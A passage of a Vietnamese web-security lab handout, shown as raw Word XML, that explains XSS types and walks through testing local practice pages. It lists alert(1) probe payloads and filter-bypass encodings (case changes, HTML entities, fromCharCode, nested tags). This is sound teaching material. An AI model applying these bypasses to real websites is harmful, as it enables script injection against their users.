          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>. Chúng ta sẽ</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="159B6DAE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thấy hộp thoại cảnh báo được bật lên</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="46EF4F71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2FE4B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Hơn nữa, khi truy cập lại vào địa chỉ http://localhost/dvwa/vulnerabilities/xss_s/ ở thời điểm bất kỳ, ta đều</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="61D024EB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nhận được hộp thoại này. Như vậy có thể thấy, mã Javascripts đã được đưa vào CSDL của website thành</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0CC233E8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công.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="26FB6685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Đến đây có thể kết luận trang web đã có lỗ hổng Stored XSS.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="17FD278B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Reflected XSS và Stored XSS có 2 sự khác biệt lớn trong quá trình tấn công.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="32A98589">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="11"/>
        </w:numPr>
        <w:ind w:left="420" w:leftChars="0" w:hanging="420" w:firstLineChars="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 Thứ nhất, để khai thác Reflected XSS, hacker phải lừa được nạn nhân truy cập vào URL của mình.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0E3E5BE6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Còn Stored XSS không cần phải thực hiện việc này, sau khi chèn được mã nguy hiểm vào CSDL</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="64F9C7CF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của ứng dụng, hacker chỉ việc ngồi chờ nạn nhân tự động truy cập vào. Với nạn nhân, việc này là</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="054CA3C2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hoàn toàn bình thường vì họ không hề hay biết dữ liệu mình truy cập đã bị nhiễm độc.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5DAB16AA">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="11"/>
        </w:numPr>
        <w:ind w:left="420" w:leftChars="0" w:hanging="420" w:firstLineChars="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 Thứ 2, mục tiêu của hacker sẽ dễ dàng đạt được hơn nếu tại thời điểm tấn công nạn nhân vẫn trong</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1CBEFCBD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phiên làm việc(session) của ứng dụng web. Với Reflected XSS, hacker có thể thuyết phục hay lừa</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="18A13971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nạn nhân đăng nhập rồi truy cập đến URL mà hắn ta cung cấp để thực thi mã độc. Nhưng Stored</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2AB442D2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XSS thì khác, vì mã độc đã được lưu trong CSDL Web nên bất cứ khi nào người dùng truy cập</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1FFB9C53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các chức năng liên quan thì mã độc sẽ được thực thi, và nhiều khả năng là những chức năng này</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2DB85084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yêu cầu phải xác thực(đăng nhập) trước nên hiển nhiên trong thời gian này người dùng vẫn đang</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="610F4C58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trong phiên làm việc.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3AF2F55D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Từ những điều này có thể thấy Stored XSS nguy hiểm hơn Reflected XSS rất nhiều, đối tượng bị ảnh</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="00532EB8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hưởng có thế là tất cả nhưng người sử dụng ứng dụng web đó. Và nếu nạn nhân có vai trò quản trị thì còn</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="74B3942A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có nguy cơ bị chiếm quyền điều khiển web.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="68E622A8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2.2.3. DOM-based XSS</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="70AF3F29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DOM-based XSS, còn gọi là XSS dạng 0, là kiểu khai thác XSS khác đi ngược lại với đặc điểm của hai</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6C2EB21E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loại trên, khi mã độc được thực thi ngay khi xử lý phía client mà không thông qua server</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2E2CE398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Kịch bản khai thác dạng DOM-based XSS như sau:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0C19DC8A">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:hint="default" w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="27726FF9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2.3 Kiểm thử lỗ hổng XSS</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4A7A058B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2.3.1. Kiểm thử hộp đen</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="459010F4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Chúng ta sử dụng cách thức kiểm thử hộp đen khi không biết được cách thức xử lý dữ liệu đầu vào của</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="78B2C48F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website mục tiêu. Các bước thực hiện kiểm thử bao gồm:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3FC86F2E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(1) Phát hiện tham số đầu vào và cách thức chúng được truyền tới server:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2AAA7532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Các tham số đầu vào cho một Website có thể bao gồm:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4614378F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Các tham số được người dùng cung cấp truyền qua phương thức GET, POST</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="509E98BD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Các giá trị của trường ẩn trong Web form</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5F78A97E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Các giá trị được định nghĩa trước cho các lựa chọn trong Web form</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="013AB831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Các giá trị trong tiêu đề HTTP Request, điển hình như Cookie.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="150BBAF1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Để xác định được hết các giá trị đầu vào, chúng ta có thể sử dụng các công cụ như Burp Suite đã được</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="59E939DB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giới thiệu trong bài thực hành trước</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6D5F3F44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(2) Phân tích tham số đầu vào:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1541A060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Trước tiên hãy kiểm thử với một số giá trị bình thường và quan sát kết quả. Phân tích và so sánh kết quả</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="43BD7FA7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trả về với những giá trị đầu vào khác nhau. Dựa vào đó, phán đoán cách thức giá trị đầu vào được xử lý</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0E2ACC3D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như thế nào, những phần nào của giá trị đầu vào xuất hiện trong kết quả trả về. Phân tích mã nguồn</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0D501864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HTML của trang web trả về là một cách thức tốt để phán đoán.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0E78BFD3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Sau khi đã phán đoán được cách thức giá trị đầu vào được sử dụng, kiểm thử với một danh sách các giá trị</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="245C0D33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tấn công vô hại được thiết kế riêng cho từ tham số đầu vào. Các giá trị này có khả năng cho thấy sự tiềm</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3723ECBB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ẩn của các lỗ hổng XSS. Danh sách các giá trị này có thể tạo một cách thủ công hoặc tự động bằng kỹ</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="680E81FD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thuật Fuzzing. Một số giá trị đầu vào điển hình có thể chứa các đoạn mã như sau:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4BE7A218">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:hint="default" w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="58010B93">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:hint="default" w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="vi-VN"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="default" w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">- Sử dụng thẻ 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&lt;</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="default" w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>scrip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&gt;</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="default" w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">. Ví dụ: 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&lt;</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="default" w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>script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&gt;</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="default" w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>alert(1)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&lt;</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="default" w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>/script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&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="58D2D623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Sử dụng thuộc tính đường dẫn href hoặc src: javascript:alert(1)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4C8D49EC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Sử dụng thuộc tính sự kiện.Ví dụ: onclick= “alert(1)” (Có thể thay thế sự kiện onclick bằng các sự</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="08AE1C58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kiện khác thích hợp với ngữ cảnh )</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="64989FC6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(3) Kiểm tra sự ảnh hưởng</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0000A32A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Dựa trên kết quả trả về khi thực hiện kiểm thử bừng các giá trị tấn công ở bước 2, phán đoán cách</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4339BDFF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thức các ký tự đặc biệt, từ khóa được xử lý như thế nào. Thông thường, các website tìm cách phát hiện và</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="29EF9B20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loại bỏ, hoặc thay thế, hoặc dùng bộ mã khác để biểu diễn các ký tự đặc biệt đã phát hiện được. Ở bước</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1377DB63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này, tùy từng ngữ cảnh khác nhau, chúng ta cần cố gắng vét cạn tất cả các dạng biểu diễn để xác định có</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="11A74364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thể vòng tránh (bypass) khỏi sự kiểm duyệt hay không.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0F3BF8E7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Một số cách thức vòng tránh phổ biến bao gồm:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="57C1DCB9">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:hint="default" w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="vi-VN"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="default" w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">- Sử dụng ký tự in hoa. Ví dụ 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&lt;</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="default" w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>SCRIPT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&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="62F71991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Sử dụng ký tự thực thể (HTML Entity). Ví dụ &amp;amp;ltscript&amp;amp;gt.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="650B439C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Xem thêm về HTML Entity: https://www.w3schools.com/html/html_entities.asp</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0628A4AE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Sử dụng mã Unicode qua hàm fromCharCode(). Ví dụ alert(String.fromCharCode(49))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4310E638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Xem thêm về hàm formCharCode(): https://www.w3schools.com/jsref/jsref_fromcharcode.asp</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="51D3F490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Sử dụng trực tiếp mã Unicode (dạng thập phân hoặc hexa). Ví dụ javascript có thể được biểu diễn:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="54A4EEFA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Hexa: &amp;amp;#x6A&amp;amp;#x61&amp;amp;#x76&amp;amp;#x61&amp;amp;#x73&amp;amp;#x63&amp;amp;#x72&amp;amp;#x69&amp;amp;#x70&amp;amp;#x74</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="46A49ADF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Thập phân:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="327EC547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&amp;amp;#0000106&amp;amp;#0000097&amp;amp;#0000118&amp;amp;#0000097&amp;amp;#0000115&amp;amp;#0000099&amp;amp;#0000114&amp;amp;#0000105&amp;amp;#0000112&amp;amp;#00</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="22F21179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00116</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="795B1F47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Hoặc: &amp;amp;#106;&amp;amp;#97;&amp;amp;#118;&amp;amp;#97;&amp;amp;#115;&amp;amp;#99;&amp;amp;#114;&amp;amp;#105;&amp;amp;#112;&amp;amp;#116;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="50675FD3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Hoặc:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="55FDEF6C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&amp;amp;#0000106&amp;amp;#0000097&amp;amp;#0000118&amp;amp;#0000097&amp;amp;#0000115&amp;amp;#0000099&amp;amp;#0000114&amp;amp;#0000105&amp;amp;#0000112&amp;amp;#00</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="436DC6AC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00116</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0A6F0161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Xem thêm: https://en.wikipedia.org/wiki/Numeric_character_reference</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7CB4AE88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Chèn ký tự tab, xuống dòng, ký tự null… Ví dụ java script, java&amp;amp;#x09;script, …</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5F3C8C00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Tùy các ngữ cảnh cụ thể có thể sử dụng mã biểu diễn Base64, URL Encoding… hoặc trộn lẫn các loại</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="44B62BB6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mã biểu diễn.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="462F36AD">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:hint="default" w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="vi-VN"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="default" w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">- Vòng tránh các bộ lọc không thực hiện đệ quy. Ví dụ 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&lt;</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="default" w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>scr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&lt;</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="default" w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>script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&gt;</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="default" w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>ipt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&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="698BD8DA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Tham khảo các cách thức vòng tránh: https://owasp.org/www-community/xss-filter-evasion-cheatsheet</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7B8C774A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2.3.2. Kiểm thử hộp xám</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="658C7AE9">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:hint="default" w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="02AD101E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Phương pháp kiểm thử hộp xám được sử dụng khi chúng ta đã biết một phần mã nguồn xử lý của website.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="49165544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Từ mã nguồn này, ta có thể xác định được các tham số đầu vào và cách thức chúng được xử lý. Do đó,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="08105F9D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các bước phán đoán như trong kiểm thử hộp đen có thể sẽ không cần thiết.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2F59F5A2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2.4 Ví dụ luyện tập</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="10EFA98E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Trong phần này, chúng ta thử một vài thao tác kiểm thử hộp đen để xác định lỗ hổng XSS.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2465208D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Download mã nguồn tại địa chỉ sau</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7B17CDBA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Giải nén và triển khai mã nguồn trên Apache HTTP Server.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="72E5CC7A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2.4.1. Ví dụ 1</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6088F58A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Xác định tham số và phương thức truyền tới server</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="48B26E88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Bước 1: Truy cập vào địa chỉ http://localhost/xss/xss1.php</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="56B670C6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Bước 2: Điền một số giá trị tùy ý vào ô nhập dữ liệu. Kết quả cho thấy chúng ta có thể phán đoán rằng</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="46D03848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giá trị đầu vào được hiển thị trong thông điệp “Wellcome Giá trị đầu vào”. Chọn</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7C342064">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:hint="default" w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="6DE1150A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Bước 2: Nhấn tổ hợp phím Ctrl+U để xem mã nguồn HTML của trang kết quả. Có thể thấy giá trị đầu</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4DBB3D9B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vào của người dùng nằm trong mã nguồn HTML. Bên cạnh đó, chúng ta có thể thấy một form HTML</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="685AA0CB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sử dụng phương thức POST để gửi tham số có tên là name tới website. Trên mã nguồn, ta không phát</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="525B5430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hiện ra trường ẩn trong form.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="61785B92">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:hint="default" w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="0EB53BC0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Bước 3: Để xác định hết các tham số mà có thể không quan sát được từ mã nguồn HTML, sử dụng</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4B830CA4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phần mềm Burp Suite như hướng dẫn bài thực hành số 5 để quan sát các thông điệp HTTP trao đổi</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="79DD252C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giữa trình duyệt và máy chủ.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2AD5A3B7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Bước 4: Trên Burp Suite, chọn thẻ Proxy  HTTP Proxy. Chọn thông điệp HTTP Request truy cập</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7FFF244E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tới địa chỉ ở trên. Ở thẻ Raw chúng ta có thể thấy đây là thông điệp sử dụng phương thức POST để</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="43836ADB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truy cập. Ở phần thân của thông điệp này có tham số và giá trị mà ta đã truyền.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="08067B90">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:hint="default" w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="21A6920A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Lưu ý: Website có thể sử dụng một số trường tiêu đề làm tham số. Tuy nhiên, trong ví dụ, chúng ta</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="197C7F8F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không xem xét tới tình huống này.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="43AB0087">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:hint="default" w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="0CBFD8C8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Trên thẻ Params chúng ta có thể khẳng định lại có tham số name được gửi bằng phương thức POST.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="65AEE0FC">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:hint="default" w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="66171D99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Phân tích tham số đầu vào và xác định sự ảnh hưởng</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="03A07AAF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Ở phần trên, ta đã phân tích để thấy rằng giá trị đầu vào được ghép thành chuỗi “Wellcome Giá trị đầu</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="37FAC0CD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vào”. Ta sẽ thử với một số giá trị đầu vào điển hình để kiểm thử lỗ hổng XSS.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7A51015C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 xml:space="preserve">- Bước 1: Thử giá trị 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&lt;</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="default" w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>script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&gt;</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="default" w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>alert(1)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&lt;</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="default" w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>/script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&gt;</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="default" w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>. Kết quả cho phép phán đoán từ script đã bị lọc.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="39E4FC84">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:hint="default" w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="076C0C50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Bước 2: Để kiểm tra xem bộ lọc có thực hiện đệ quy không, chúng ta sử dụng giá trị</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="636440E3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  <w:lang w:val="vi-VN"/>
        </w:rPr>
        <w:t>&lt;</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="default" w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>sscriptcript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&gt;</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="default" w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>alert(1)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&lt;</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="default" w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>/sscriptcript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&gt;</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="default" w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>. Kết quả không thay đổi với bước trên. Như vậy, có thể thấy rằng mọi</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="72A7F14C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từ script sẽ bị lọc khỏi giá trị đầu vào cho tới khi hết.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="11867D22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Bước 3: Để kiểm tra bộ lọc có kiểm tra dạng in hoa hay không, chúng ta sử dụng giá trị</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5F902C3A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  <w:lang w:val="vi-VN"/>
        </w:rPr>
        <w:t>&lt;</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="default" w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>sCript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&gt;</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="default" w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>alert(1)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&lt;</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="default" w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>/sCript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&gt;</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="default" w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>. Kết quả cho thấy bộ lọc không thực hiện kiểm tra dạng in hoa nên đoạn mã đã</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="634F7D00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được thực thi.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4CA8005C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Để vá lỗ hổng này, mở fie và sửa nội dung như sau:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="721A8000">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:hint="default" w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="061CC087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Thử lại các bước kiểm thử trên và một số phương pháp vòng tránh khác để thấy tác dụng.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="352FD661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2.4.2. Ví dụ 2</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="41115767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Xác định tham số và phương thức truyền tới server</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5E0873B4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Bước 1: Truy cập vào địa chỉ http://localhost/xss/xss2.php</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1DE33DAF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Bước 2: Điền địa chỉ một website nào đó và nhấn nút Create link. Kết quả cho thấy một đường link được</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2A41B0C0">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:hint="default" w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="vi-VN"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
